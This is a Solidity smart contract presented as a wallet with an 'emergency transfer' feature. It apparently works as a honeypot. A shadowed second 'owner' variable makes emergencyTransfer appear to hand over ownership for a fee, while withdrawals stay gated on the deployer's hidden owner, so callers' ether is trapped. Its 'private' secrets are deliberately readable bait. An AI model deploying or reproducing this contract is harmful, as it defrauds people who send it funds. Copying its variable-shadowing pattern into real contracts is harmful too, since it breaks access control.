1 pragma solidity ^0.4.18;
2 
3 contract Owned {
4     address owner;
5 
6     function Owned() public {
7         owner = msg.sender;
8     }
9 
10     modifier onlyOwner {
11         if (msg.sender != owner)
12             revert();
13         _;
14     }
15 }
16 
17 contract WalletWithEmergencyTransfer is Owned {
18 
19     event Deposit(address from, uint amount);
20     event Withdrawal(address from, uint amount);
21     event Call(address from, address to, uint amount);
22     address public owner = msg.sender;
23     uint256 private emergencyCode;
24     uint256 private emergencyAmount;
25 
26     function WalletWithEmergencyTransfer() public {
27     }
28 
29     function() public payable {
30         deposit();
31     }
32 
33     function deposit() public payable {
34         require(msg.value > 0);
35         Deposit(msg.sender, msg.value);
36     }
37 
38     function withdraw(uint amount) public onlyOwner {
39         require(amount <= this.balance);
40         msg.sender.transfer(amount);
41         Withdrawal(msg.sender, amount);
42     }
43 
44     function call(address addr, bytes data, uint256 amount) public payable onlyOwner {
45         if (msg.value > 0)
46             deposit();
47 
48         require(addr.call.value(amount)(data));
49         Call(msg.sender, addr, amount);
50     }
51 
52     function setEmergencySecrets(uint256 code, uint256 amount) public onlyOwner {
53         emergencyCode = code;
54         emergencyAmount = amount;
55     }
56 
57     function emergencyTransfer(uint256 code, address newOwner) public payable {
58         if ((code == emergencyCode) &&
59             (msg.value == emergencyAmount) &&
60             (newOwner != address(0))) {
61             owner = msg.sender;
62         }
63     }
64 }